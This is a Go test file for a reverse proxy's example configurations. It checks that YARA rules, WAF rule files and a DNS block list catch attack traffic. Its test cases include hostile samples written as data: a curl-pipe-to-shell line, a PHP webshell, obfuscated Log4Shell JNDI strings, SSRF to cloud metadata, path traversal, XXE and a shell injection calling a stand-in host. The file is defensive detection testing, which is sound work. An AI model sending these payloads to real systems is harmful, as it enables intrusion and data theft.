// Package examples validates everything under examples/: the YAML
// documents against the configuration schema, the SecLang files against
// the engine with sample traffic, the block list against the DNS loader,
// the WebAssembly module against the filter, and the rewriting rules
// against sample bodies.
package examples

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/textproto"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/rom/xproxy/internal/config"
	"github.com/rom/xproxy/internal/dns"
	"github.com/rom/xproxy/internal/filter"
	_ "github.com/rom/xproxy/internal/filters" // built-in kinds
	"github.com/rom/xproxy/internal/filters/apikey"
	"github.com/rom/xproxy/internal/fleet"
	"github.com/rom/xproxy/internal/listener"
	"github.com/rom/xproxy/internal/mfa"
	"github.com/rom/xproxy/internal/passwd"
	"github.com/rom/xproxy/internal/waf"
	"github.com/rom/xproxy/internal/yara"
)

var nolog = slog.New(slog.NewTextHandler(io.Discard, nil))

func root(t *testing.T) string {
	t.Helper()
	p, err := filepath.Abs("../../examples")
	if err != nil {
		t.Fatal(err)
	}
	return p
}

// TestYAMLDocuments parses every complete document and wraps every
// fragment in a main file that includes it.
func TestYAMLDocuments(t *testing.T) {
	dir := root(t)
	var files []string
	err := filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error {
		if err == nil && !d.IsDir() && strings.HasSuffix(p, ".yaml") {
			files = append(files, p)
		}
		return err
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(files) < 8 {
		t.Fatalf("only %d example documents found", len(files))
	}
	for _, f := range files {
		t.Run(strings.TrimPrefix(f, dir+"/"), func(t *testing.T) {
			data, err := os.ReadFile(f) //nolint:gosec // test input
			if err != nil {
				t.Fatal(err)
			}
			if strings.HasPrefix(string(data), "openapi:") {
				return // an API description referenced by a filter, not a configuration
			}
			// Kinds that open their files at validation get a real one.
			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/tools-users", usersFile(t)))
			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/filters/policy.wasm", filepath.Join(dir, "filters", "wasm", "policy.wasm")))
			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/api-keys", keysFile(t)))
			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/ldap.secret", secretFile(t)))
			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/openapi/orders.yaml", filepath.Join(dir, "filters", "orders-openapi.yaml")))
			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/staff.htpasswd", usersFile(t)))
			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/mfa", mfaFile(t)))
			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/rules/stream.yar", filepath.Join(dir, "yara", "rules.yar")))
			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/yara", filepath.Join(dir, "yara")))
			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/estate.d", filepath.Join(dir, "estate", "estate.d")))
			// A recording directory has to exist at load: the proxy
			// does not create one, because where those files live is a
			// decision rather than a default.
			data = []byte(strings.ReplaceAll(string(data), "/var/log/xproxy/sessions", t.TempDir()))
			if strings.Contains(string(data), "\nversion: 1\n") || strings.HasPrefix(string(data), "version: 1\n") {
				cfg, err := config.ParseWith(data, false)
				if err != nil {
					t.Fatalf("complete document: %v", err)
				}
				checkOneDaemon(t, cfg)
				return
			}
			// A fragment: include it from a minimal main file.
			main := fmt.Sprintf(`
version: 1
includes: [%q]
server:
  listeners: [{name: main, address: "127.0.0.1:0"}]
upstreams:
  - name: web
    endpoints: [{address: "10.0.0.1:8080"}]
routes:
  - {name: default, upstream: web}
`, f)
			if _, err := config.ParseWith([]byte(main), false); err != nil {
				t.Fatalf("fragment: %v", err)
			}
		})
	}
}

// TestYARARules compiles the example rule set and checks that each
// rule matches something it claims to and nothing it does not. A rule
// file that compiles but matches nothing is the failure mode worth
// catching.
func TestYARARules(t *testing.T) {
	rs, err := yara.LoadFile(filepath.Join(root(t), "yara", "rules.yar"))
	if err != nil {
		t.Fatalf("compile: %v", err)
	}
	cases := []struct {
		rule  string
		input string
	}{
		{"executable_header", "MZ\x90\x00\x03 padding PE\x00\x00 rest"},
		{"executable_header", "\x7fELF\x02\x01\x01"},
		{"archive_of_executables", "PK\x03\x04 invoice.EXE"},
		{"shell_payload", "curl -s http://x | sh ; chmod +x /tmp/a"},
		{"credential_exfiltration", "key=AKIAIOSFODNN7EXAMPLE"},
		{"credential_exfiltration", "-----BEGIN OPENSSH PRIVATE KEY-----"},
		{"internal_marker", "this file is XPROXY-INTERNAL-ONLY"},
		{"webshell_upload", "<?php eval(base64_decode($_POST[0])); ?>"},
		{"sqlite_database", "SQLite format 3\x00 rest of the header"},
	}
	for _, c := range cases {
		found := false
		for _, m := range rs.Scan([]byte(c.input)) {
			if m.Rule == c.rule {
				found = true
			}
		}
		if !found {
			t.Errorf("%s did not match %q", c.rule, c.input)
		}
	}
	// Ordinary traffic must not trip any of them.
	for _, clean := range []string{
		"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n",
		"{\"order\": 42, \"customer\": \"acme\"}",
		"a plain text document about curl and shells",
	} {
		if ms := rs.Scan([]byte(clean)); len(ms) != 0 {
			t.Errorf("%q matched %v", clean, ms)
		}
	}
}

// mfaFile writes a one user enrolment file for the mfa example.
func mfaFile(t *testing.T) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "mfa")
	secret, err := mfa.NewSecret()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte("alice:"+secret+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

// usersFile writes a one user file for the basic_auth example.
// keysFile writes an api_key keys file with one key.
func keysFile(t *testing.T) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "api-keys")
	if _, err := apikey.Add(p, "acme", []string{"orders:read"}, time.Time{}, "example"); err != nil {
		t.Fatal(err)
	}
	return p
}

// secretFile writes a non world-readable one line secret, for kinds that
// check the permissions of a password file at validation.
func secretFile(t *testing.T) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "secret")
	if err := os.WriteFile(p, []byte("s3cret\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func usersFile(t *testing.T) string {
	t.Helper()
	h, err := passwd.Hash("correct horse")
	if err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(t.TempDir(), "users")
	if err := os.WriteFile(p, []byte("alice:"+h+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func wafEngine(t *testing.T, files ...string) *waf.Engine {
	t.Helper()
	abs := make([]string, 0, len(files))
	for _, f := range files {
		abs = append(abs, filepath.Join(root(t), "waf", f))
	}
	cfg := &config.WAF{
		Profiles:               []config.WAFProfile{{Name: "default", CRS: &config.CRS{ParanoiaLevel: 1, InboundThreshold: 5, OutboundThreshold: 4}, DirectiveFiles: abs}},
		DefaultMode:            "block",
		DefaultProfile:         "default",
		RequestBodyLimit:       65536,
		RequestBodyLimitAction: "reject",
		InspectResponses:       true,
		ResponseBodyLimit:      65536,
		ResponseMIMETypes:      []string{"text/html", "text/plain", "application/json"},
	}
	e, err := waf.New(cfg, waf.Need{"default": {waf.ModeBlock: true}}, nil, nolog)
	if err != nil {
		t.Fatalf("compile %v: %v", files, err)
	}
	return e
}

// wafEngineBare compiles rule files without the Core Rule Set, so a
// test can prove which of the file's own rules refused a request. With
// the CRS loaded, its rules run first and a custom rule that no longer
// matches would never be noticed.
func wafEngineBare(t *testing.T, files ...string) *waf.Engine {
	t.Helper()
	abs := make([]string, 0, len(files))
	for _, f := range files {
		abs = append(abs, filepath.Join(root(t), "waf", f))
	}
	cfg := &config.WAF{
		Profiles:               []config.WAFProfile{{Name: "default", DirectiveFiles: abs}},
		DefaultMode:            "block",
		DefaultProfile:         "default",
		RequestBodyLimit:       65536,
		RequestBodyLimitAction: "reject",
		InspectResponses:       true,
		ResponseBodyLimit:      65536,
		ResponseMIMETypes:      []string{"text/html", "text/plain", "application/json"},
	}
	e, err := waf.New(cfg, waf.Need{"default": {waf.ModeBlock: true}}, nil, nolog)
	if err != nil {
		t.Fatalf("compile %v: %v", files, err)
	}
	return e
}

func wafRequest(t *testing.T, e *waf.Engine, r *http.Request) filter.Verdict {
	t.Helper()
	f, err := e.Filter("default", waf.ModeBlock)
	if err != nil {
		t.Fatal(err)
	}
	in := f.Begin(context.Background(), &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9"), Route: "r", Host: r.Host, Path: r.URL.Path})
	v := in.Request(r)
	in.End()
	return v
}

func TestWAFExclusions(t *testing.T) {
	e := wafEngine(t, "exclusions.conf")
	// The excluded parameter passes on its path...
	post := func(path, body string) *http.Request {
		r := httptest.NewRequest("POST", "http://www.example.com"+path, strings.NewReader(body))
		r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		r.Header.Set("Content-Length", fmt.Sprint(len(body)))
		r.Header.Set("User-Agent", "Mozilla/5.0")
		return r
	}
	if v := wafRequest(t, e, post("/posts", "body=<b>bold</b><a href=x onclick=alert(1)>hi</a>")); v.Deny {
		t.Fatalf("excluded target still blocked: %+v", v)
	}
	// ...but the same payload in another parameter or on another path
	// is still blocked.
	if v := wafRequest(t, e, post("/posts", "title=<script>alert(1)</script>")); !v.Deny {
		t.Fatal("other parameter not blocked")
	}
	if v := wafRequest(t, e, post("/comments", "body=<script>alert(1)</script>")); !v.Deny {
		t.Fatal("other path not blocked")
	}
	// Uploads skip body inspection; the body still reaches the upstream.
	big := post("/files/upload", "data=<script>alert(1)</script>")
	if v := wafRequest(t, e, big); v.Deny {
		t.Fatalf("upload body inspected: %+v", v)
	}
	if b, _ := io.ReadAll(big.Body); !strings.Contains(string(b), "alert") {
		t.Fatal("upload body not replayed")
	}
}

func TestWAFCustomRules(t *testing.T) {
	e := wafEngine(t, "exclusions.conf", "custom-rules.conf")
	get := func(host, path string, hdr ...string) *http.Request {
		r := httptest.NewRequest("GET", "http://"+host+path, nil)
		r.Header.Set("User-Agent", "Mozilla/5.0")
		for i := 0; i+1 < len(hdr); i += 2 {
			r.Header.Set(hdr[i], hdr[i+1])
		}
		return r
	}
	cases := []struct {
		name   string
		r      *http.Request
		status int
	}{
		{"debug header", get("www.example.com", "/", "X-Debug", "true"), 403},
		{"virtual patch", get("www.example.com", "/plugins/legacy-export/run?x=1"), 404},
		{"ip host", get("203.0.113.5", "/"), 400},
		{"secret probe scores", get("www.example.com", "/.env"), 403},
	}
	for _, c := range cases {
		v := wafRequest(t, e, c.r)
		if !v.Deny || v.Status != c.status {
			t.Errorf("%s: %+v", c.name, v)
		}
	}
	// API write without JSON: 415; with JSON: passes.
	r := httptest.NewRequest("POST", "http://api.example.com/api/orders", strings.NewReader("a=1"))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Set("Content-Length", "3")
	r.Header.Set("User-Agent", "client/1.0")
	if v := wafRequest(t, e, r); !v.Deny || v.Status != 415 {
		t.Fatalf("form to api: %+v", v)
	}
	r = httptest.NewRequest("POST", "http://api.example.com/api/orders", strings.NewReader(`{"id":1}`))
	r.Header.Set("Content-Type", "application/json")
	r.Header.Set("Content-Length", "8")
	r.Header.Set("User-Agent", "client/1.0")
	if v := wafRequest(t, e, r); v.Deny {
		t.Fatalf("json to api: %+v", v)
	}
	if v := wafRequest(t, e, get("www.example.com", "/products?page=2")); v.Deny {
		t.Fatalf("clean request: %+v", v)
	}
}

// TestWAFHardeningRules compiles the second custom rule file and puts
// one request through every rule in it. A rule file that compiles but
// no longer matches is worse than no rule file: it is a control an
// operator believes is there.
func TestWAFHardeningRules(t *testing.T) {
	e := wafEngine(t, "hardening-rules.conf")
	get := func(path string, hdr ...string) *http.Request {
		r := httptest.NewRequest("GET", "http://www.example.com"+path, nil)
		r.Header.Set("User-Agent", "Mozilla/5.0")
		for i := 0; i+1 < len(hdr); i += 2 {
			r.Header.Set(hdr[i], hdr[i+1])
		}
		return r
	}
	post := func(path, ctype, body string) *http.Request {
		r := httptest.NewRequest("POST", "http://www.example.com"+path, strings.NewReader(body))
		r.Header.Set("Content-Type", ctype)
		r.Header.Set("Content-Length", fmt.Sprint(len(body)))
		r.Header.Set("User-Agent", "Mozilla/5.0")
		return r
	}
	manyArgs := "/search?" + strings.Repeat("a=1&", 101)
	manyCookies := make([]string, 0, 60)
	for i := range 60 {
		manyCookies = append(manyCookies, fmt.Sprintf("c%d=1", i))
	}
	for _, c := range []struct {
		name   string
		r      *http.Request
		status int
	}{
		{"backup suffix", get("/config.php.bak"), 404},
		{"editor swap file", get("/notes.swp"), 404},
		{"source directory", get("/.git/config"), 404},
		{"dependency directory", get("/node_modules/.bin/x"), 404},
		{"jndi lookup in a header", get("/", "X-Api-Version", "${jndi:ldap://x.example.invalid/a}"), 403},
		{"jndi lookup in a parameter", get("/?q=%24%7Bjndi%3Aldap%3A%2F%2Fx.example.invalid%2Fa%7D"), 403},
		{"class loader parameter", post("/bind", "application/x-www-form-urlencoded", "class.module.classLoader.URLs%5B0%5D=x"), 403},
		{"path parameter segment", get("/app/..;/manager/html"), 400},
		{"diagnostic method", httptest.NewRequest("TRACE", "http://www.example.com/", nil), 405},
		{"executable upload", post("/upload", "multipart/form-data; boundary=b",
			"--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"shell.php\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--b--\r\n"), 415},
		{"too many parameters", get(manyArgs), 400},
		{"too many cookies", get("/", "Cookie", strings.Join(manyCookies, "; ")), 400},
		{"many byte ranges", get("/big.bin", "Range", "bytes=0-1,2-3,4-5,6-7,8-9,10-11,12-13,14-15,16-17,18-19,20-21"), 416},
		{"graphql introspection", post("/graphql", "application/json", `{"query":"{ __schema { types { name } } }"}`), 403},
	} {
		if v := wafRequest(t, e, c.r); !v.Deny || v.Status != c.status {
			t.Errorf("%s: %+v, want a deny with %d", c.name, v, c.status)
		}
	}
	// The JNDI payload is written to be unrecognisable, so every
	// obfuscation that reaches the same lookup has to be refused with
	// the plain one. Each of these is a form seen in the wild.
	for _, payload := range []string{
		"${jndi:ldap://x.example.invalid/a}",
		"${${lower:j}ndi:ldap://x.example.invalid/a}",
		"${${::-j}${::-n}${::-d}${::-i}:ldap://x.example.invalid/a}",
		"${jndi:${lower:l}${lower:d}ap://x.example.invalid/a}",
		"${${env:NOPE:-j}ndi${env:NOPE:-:}${env:NOPE:-l}dap://x.example.invalid/a}",
	} {
		for _, r := range []*http.Request{
			get("/?q=" + url.QueryEscape(payload)),
			get("/", "X-Api-Version", payload),
			get("/", "User-Agent", payload),
			post("/api/orders", "application/json", fmt.Sprintf(`{"note":%q}`, payload)),
		} {
			if v := wafRequest(t, e, r); !v.Deny || v.Status != 403 {
				t.Errorf("%s through %s %s: %+v, want a deny with 403", payload, r.Method, r.URL, v)
			}
		}
	}
	// A template expression scores rather than denies on its own, so one
	// of them is not a refusal but two signals together are.
	if v := wafRequest(t, e, get("/?name=%7B%7B7*7%7D%7D")); v.Deny {
		t.Errorf("the template rule denied on its own: %+v", v)
	}
	// Ordinary traffic is untouched by all of it.
	for _, r := range []*http.Request{
		get("/products?page=2&sort=price"),
		get("/assets/app.1a2b3c.js"),
		post("/api/orders", "application/json", `{"id":1,"note":"a {curly} brace"}`),
		get("/big.bin", "Range", "bytes=0-1023"),
	} {
		if v := wafRequest(t, e, r); v.Deny {
			t.Errorf("clean request %s denied: %+v", r.URL, v)
		}
	}
	// What must never leave: the response rules.
	for _, c := range []struct {
		name string
		body string
		deny bool
	}{
		{"private key", "-----BEGIN RSA PRIVATE KEY-----\nMIIB\n-----END RSA PRIVATE KEY-----\n", true},
		{"aws key id", `{"key":"AKIAIOSFODNN7EXAMPLE"}`, true},
		{"sql error", "SQLSTATE[42000]: Syntax error or access violation", true},
		{"ordinary page", `{"items":[{"id":1,"name":"widget"}]}`, false},
	} {
		f, err := e.Filter("default", waf.ModeBlock)
		if err != nil {
			t.Fatal(err)
		}
		in := f.Begin(context.Background(), &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9"), Route: "r", Host: "www.example.com", Path: "/"})
		in.Request(get("/"))
		resp := &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"application/json"}},
			Body: io.NopCloser(strings.NewReader(c.body))}
		v := in.Response(resp)
		in.End()
		if v.Deny != c.deny {
			t.Errorf("response %s: %+v, want deny=%v", c.name, v, c.deny)
		}
	}
}

// TestWAFAttackSurfaceRules compiles the third custom rule file and
// puts one request through every rule in it, then the traffic that
// must still pass. These rules refuse shapes rather than payloads, so
// the false-positive cases matter as much as the matches.
func TestWAFAttackSurfaceRules(t *testing.T) {
	e := wafEngine(t, "attack-surface-rules.conf")
	bare := wafEngineBare(t, "attack-surface-rules.conf")
	get := func(path string, hdr ...string) *http.Request {
		r := httptest.NewRequest("GET", "http://www.example.com"+path, nil)
		r.Header.Set("User-Agent", "Mozilla/5.0")
		for i := 0; i+1 < len(hdr); i += 2 {
			r.Header.Set(hdr[i], hdr[i+1])
		}
		return r
	}
	post := func(path, ctype, body string, hdr ...string) *http.Request {
		r := httptest.NewRequest("POST", "http://www.example.com"+path, strings.NewReader(body))
		r.Header.Set("Content-Type", ctype)
		r.Header.Set("Content-Length", fmt.Sprint(len(body)))
		r.Header.Set("User-Agent", "Mozilla/5.0")
		for i := 0; i+1 < len(hdr); i += 2 {
			r.Header.Set(hdr[i], hdr[i+1])
		}
		return r
	}
	form := func(name, value string, hdr ...string) *http.Request {
		return post("/submit", "application/x-www-form-urlencoded", url.Values{name: {value}}.Encode(), hdr...)
	}
	upload := func(filename, ctype string) *http.Request {
		body := "--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"" + filename + "\"\r\n" +
			"Content-Type: " + ctype + "\r\n\r\nx\r\n--b--\r\n"
		return post("/upload", "multipart/form-data; boundary=b", body)
	}
	arg := func(v string) *http.Request { return get("/fetch?target=" + url.QueryEscape(v)) }
	// Each case names the rule it must trip. Asserting only "denied"
	// would pass on a CRS rule that happened to catch the same request,
	// which is how a custom rule rots without anyone noticing. Each
	// request is built twice, because the first engine reads its body.
	for _, c := range []struct {
		id   string
		name string
		mk   func() *http.Request
	}{
		{"22001", "imds address", func() *http.Request { return arg("http://169.254.169.254/latest/meta-data/") }},
		{"22001", "google metadata name", func() *http.Request { return arg("http://metadata.google.internal/computeMetadata/v1/") }},
		{"22002", "file scheme", func() *http.Request { return arg("file:///etc/hostname") }},
		{"22002", "gopher scheme", func() *http.Request { return arg("gopher://10.0.0.1:6379/_INFO") }},
		{"22003", "system file", func() *http.Request { return arg("../../etc/passwd") }},
		{"22003", "proc self environ", func() *http.Request { return arg("/proc/self/environ") }},
		{"22004", "stream wrapper", func() *http.Request { return arg("php://filter/convert.base64-encode/resource=index.php") }},
		{"22005", "java object", func() *http.Request { return form("state", "rO0ABXNyABFqYXZh") }},
		{"22006", "php object", func() *http.Request { return form("u", `O:8:"Example":1:{s:4:"path";s:6:"/etc/x";}`) }},
		{"22007", "yaml object tag", func() *http.Request { return form("value", "!!python/object/apply:os.system [id]") }},
		{"22008", "external entity", func() *http.Request {
			return post("/soap", "application/xml",
				`<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "http://x.example.invalid/e">]><d>&x;</d>`)
		}},
		{"22009", "operator parameter name", func() *http.Request { return get("/users?%24where=1") }},
		{"22010", "executing operator in json", func() *http.Request {
			return post("/api/search", "application/json", `{"$where":"this.a==1"}`)
		}},
		{"22011", "shell command", func() *http.Request { return arg("x; curl http://drop.example.invalid/a ") }},
		{"22013", "spel header", func() *http.Request {
			return get("/", "spring.cloud.function.routing-expression", "T(java.lang.Runtime)")
		}},
		{"22014", "shellshock", func() *http.Request { return get("/", "X-Api-Version", "() { :; }; echo vulnerable") }},
		{"22015", "obfuscated transfer encoding", func() *http.Request { return get("/", "Transfer-Encoding", "chunked, chunked") }},
		{"22016", "framing headers together", func() *http.Request { return form("a", "1", "Transfer-Encoding", "chunked") }},
		{"22017", "override header", func() *http.Request { return get("/", "X-Original-URL", "/admin") }},
		{"22017", "forwarded host", func() *http.Request { return get("/", "X-Forwarded-Host", "attacker.example.invalid") }},
		{"22018", "cache deception", func() *http.Request { return get("/account/settings.css") }},
		{"22019", "prototype pollution", func() *http.Request { return form("__proto__[x]", "1") }},
		{"22020", "header injection", func() *http.Request { return get("/redirect?to=%0d%0aSet-Cookie%3A%20a%3Db") }},
		{"22022", "debugger parameter", func() *http.Request { return get("/?XDEBUG_SESSION_START=1") }},
		{"22023", "browser executing upload", func() *http.Request { return upload("logo.svg", "image/svg+xml") }},
		{"22024", "scanner user agent", func() *http.Request {
			return get("/", "User-Agent", "sqlmap/1.7.2#stable (https://sqlmap.org)")
		}},
		{"22025", "write without a user agent", func() *http.Request {
			r := httptest.NewRequest("POST", "http://www.example.com/api/orders", strings.NewReader(`{"id":1}`))
			r.Header.Set("Content-Type", "application/json")
			r.Header.Set("Content-Length", "8")
			return r
		}},
	} {
		v := wafRequest(t, bare, c.mk())
		if !v.Deny {
			t.Errorf("%s (%s): %+v, want a deny", c.name, c.id, v)
			continue
		}
		if !matchedRule(v, c.id) {
			t.Errorf("%s: denied by %v, want rule %s among them", c.name, attr(v, "waf_matched"), c.id)
		}
		// And the same request is still refused with the CRS loaded,
		// whichever of the two gets to it first.
		if v := wafRequest(t, e, c.mk()); !v.Deny {
			t.Errorf("%s: passed with the CRS loaded: %+v", c.name, v)
		}
	}
	// Two rules score rather than refuse: an absolute return-to link
	// and a parenthesised expression are both things a legitimate
	// client sends, so the CRS threshold decides together with
	// everything else the request did. Without the CRS there is no
	// threshold, which is where a `pass` rule proves it is one.
	for _, r := range []*http.Request{
		get("/login?next=https%3A%2F%2Fwww.example.com%2Faccount"),
		get("/quote?amount=%24%2812%29"),
	} {
		if v := wafRequest(t, bare, r); v.Deny {
			t.Errorf("a scoring rule refused on its own: %s: %+v", r.URL, v)
		}
	}
	// The absolute link is still not a refusal with the CRS loaded: it
	// is one signal, and one signal is under the threshold.
	if v := wafRequest(t, e, get("/login?next=https%3A%2F%2Fwww.example.com%2Faccount")); v.Deny {
		t.Errorf("the redirect rule denied on its own: %+v", v)
	}
	// Traffic these rules must not touch. Each one is a shape close
	// enough to a rule above to be worth proving.
	for _, c := range []struct {
		name string
		r    *http.Request
	}{
		{"an ordinary page", get("/products?page=2&sort=price")},
		{"a static asset", get("/assets/app.1a2b3c.js")},
		{"a form post with neither framing header spelled oddly", form("comment", "hello")},
		{"an https url parameter", arg("https://cdn.example.com/logo.png")},
		{"a path that mentions a private word", get("/blog/my-account-settings")},
		{"an image upload", upload("logo.png", "image/png")},
		{"a library user agent", get("/api/health", "User-Agent", "example-client/2.1 (+https://example.com)")},
		{"a semicolon in prose", form("body", "first; second; and a third")},
	} {
		if v := wafRequest(t, e, c.r); v.Deny {
			t.Errorf("%s was denied: %+v", c.name, v)
		}
	}
	// The response rules.
	for _, c := range []struct {
		name string
		body string
		deny bool
	}{
		{"python traceback", "Traceback (most recent call last):\n  File \"/srv/app.py\", line 42", true},
		{"php warning", `<b>Warning</b>: include(/var/www/config.php): failed to open stream`, true},
		{"directory listing", "<html><head><title>Index of /backups</title></head>", true},
		{"an ordinary page", `{"items":[{"id":1,"name":"widget"}]}`, false},
	} {
		f, err := e.Filter("default", waf.ModeBlock)
		if err != nil {
			t.Fatal(err)
		}
		in := f.Begin(context.Background(), &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9"), Route: "r", Host: "www.example.com", Path: "/"})
		in.Request(get("/"))
		resp := &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"text/html"}},
			Body: io.NopCloser(strings.NewReader(c.body))}
		v := in.Response(resp)
		in.End()
		if v.Deny != c.deny {
			t.Errorf("response %s: %+v, want deny=%v", c.name, v, c.deny)
		}
	}
}

// TestWAFPluginAndSchema compiles the example plugin directory and the
// order schema into a profile.
func TestWAFPluginAndSchema(t *testing.T) {
	cfg := &config.WAF{
		Profiles: []config.WAFProfile{{Name: "default",
			CRS: &config.CRS{ParanoiaLevel: 1, InboundThreshold: 5, OutboundThreshold: 4, PluginsDir: filepath.Join(root(t), "waf", "plugins")},
			JSONSchemas: []config.WAFJSONSchema{{Name: "order", Paths: []string{"/api/orders"}, Methods: []string{"POST", "PUT"},
				SchemaFile: filepath.Join(root(t), "waf", "order-schema.json"), Required: true}}}},
		DefaultMode: "block", DefaultProfile: "default", RequestBodyLimit: 65536, RequestBodyLimitAction: "reject", ResponseBodyLimit: 65536,
	}
	e, err := waf.New(cfg, waf.Need{"default": {waf.ModeBlock: true}}, nil, nolog)
	if err != nil {
		t.Fatal(err)
	}
	if ps := e.Profiles(); len(ps) != 1 || len(ps[0].Plugins) != 1 || ps[0].Plugins[0] != "deny-agents" || len(ps[0].Schemas) != 1 {
		t.Fatalf("profiles = %+v", ps)
	}
	r := httptest.NewRequest("GET", "http://www.example.com/", nil)
	r.Header.Set("User-Agent", "Mozilla/5.0 zgrab/0.x")
	if v := wafRequest(t, e, r); !v.Deny || v.Status != 403 {
		t.Fatalf("listed agent: %+v", v)
	}
	r = httptest.NewRequest("GET", "http://www.example.com/", nil)
	r.Header.Set("User-Agent", "Mozilla/5.0")
	if v := wafRequest(t, e, r); v.Deny {
		t.Fatalf("plain agent denied: %+v", v)
	}
	order := func(body string) *http.Request {
		r := httptest.NewRequest("POST", "http://api.example.com/api/orders", strings.NewReader(body))
		r.Header.Set("Content-Type", "application/json")
		r.Header.Set("User-Agent", "Mozilla/5.0")
		return r
	}
	if v := wafRequest(t, e, order(`{"sku":"ABC-1234","quantity":2,"address":{"street":"Main 1","postcode":"11122","country":"SE"}}`)); v.Deny {
		t.Fatalf("valid order denied: %+v", v)
	}
	if v := wafRequest(t, e, order(`{"sku":"abc","quantity":500,"address":{"street":"Main 1","postcode":"11122","country":"XX"}}`)); !v.Deny || v.Status != 400 || !strings.HasPrefix(v.Detail, "json_schema:order:") {
		t.Fatalf("invalid order: %+v", v)
	}
	if v := wafRequest(t, e, httptest.NewRequest("POST", "http://api.example.com/api/orders", nil)); !v.Deny || v.Status != 400 {
		t.Fatalf("missing body: %+v", v)
	}
}

// TestFleetExample validates the example controller directory the way
// xproxy-fleet validate does.
func TestFleetExample(t *testing.T) {
	problems, ids, err := fleet.ValidateDir(filepath.Join(root(t), "fleet"))
	if err != nil {
		t.Fatal(err)
	}
	if len(ids) != 2 || len(problems) != 0 {
		t.Fatalf("ids %v problems %v", ids, problems)
	}
	b, err := fleet.Read(filepath.Join(root(t), "fleet", "common"), filepath.Join(root(t), "fleet", "nodes", "edge-1"))
	if err != nil {
		t.Fatal(err)
	}
	if len(b.Files) != 2 || b.Files[0].Path != "waf/custom.conf" || b.Files[1].Path != "xproxy.yaml" {
		t.Fatalf("bundle %+v", b.Files)
	}
}

func TestDNSBlockList(t *testing.T) {
	bl, err := dns.NewBlockList(nil)
	if err != nil {
		t.Fatal(err)
	}
	n, err := bl.LoadBlockFile(filepath.Join(root(t), "blocklists", "dns-blocklist.txt"))
	if err != nil {
		t.Fatal(err)
	}
	if n < 7 {
		t.Fatalf("%d entries loaded", n)
	}
	blocked := []string{"telemetry.example-vendor.net", "x.telemetry.example-vendor.net", "metrics.example-tracker.com",
		"beacon.example-ads.org", "c2.example-malicious.top", "a.dyn.example-botnet.xyz", "ads.example-cdn.com", "files.zip"}
	allowed := []string{"example-vendor.net", "dyn.example-botnet.xyz", "www.ads.example-cdn.com", "zip", "example.com"}
	for _, n := range blocked {
		if !bl.Match(n) {
			t.Errorf("%s should be blocked", n)
		}
	}
	for _, n := range allowed {
		if bl.Match(n) {
			t.Errorf("%s should not be blocked", n)
		}
	}
}

// filterFromExample builds the named filter of an example document.
func filterFromExample(t *testing.T, file, name string) filter.Filter {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(root(t), file)) //nolint:gosec // test input
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := config.ParseWith(data, false)
	if err != nil {
		t.Fatal(err)
	}
	for _, fc := range cfg.Filters {
		if fc.Name != name {
			continue
		}
		k, ok := filter.Lookup(fc.Kind)
		if !ok {
			t.Fatalf("kind %s not registered", fc.Kind)
		}
		f, err := k.New(fc.Name, filter.Options(fc.Options), filter.Env{Log: nolog})
		if err != nil {
			t.Fatal(err)
		}
		return f
	}
	t.Fatalf("filter %s not in %s", name, file)
	return nil
}

func TestHeaderPolicy(t *testing.T) {
	f := filterFromExample(t, "filters/header-policy.yaml", "api-headers")
	info := &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9")}
	r := httptest.NewRequest("GET", "http://api.example.com/v1/users", nil)
	r.Header.Set("X-API-Version", "2024-06-01")
	r.Header.Set("Accept", "application/json")
	if v := f.Begin(context.Background(), info).Request(r); v.Deny {
		t.Fatalf("conforming request denied: %+v", v)
	}
	r.Header.Set("X-Real-IP", "10.0.0.1")
	if v := f.Begin(context.Background(), info).Request(r); !v.Deny || v.Status != 400 || v.Reason != "api_header_policy" {
		t.Fatalf("spoofed header accepted: %+v", v)
	}
	r = httptest.NewRequest("GET", "http://api.example.com/v1/users", nil)
	if v := f.Begin(context.Background(), info).Request(r); !v.Deny {
		t.Fatal("missing version header accepted")
	}
}

// TestUploadGuard runs the example upload filters against multipart
// uploads.
func TestUploadGuard(t *testing.T) {
	f := filterFromExample(t, "filters/uploads.yaml", "uploads")
	info := &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9")}
	upload := func(field, name, ctype string, data []byte) *http.Request {
		var buf bytes.Buffer
		w := multipart.NewWriter(&buf)
		h := textproto.MIMEHeader{}
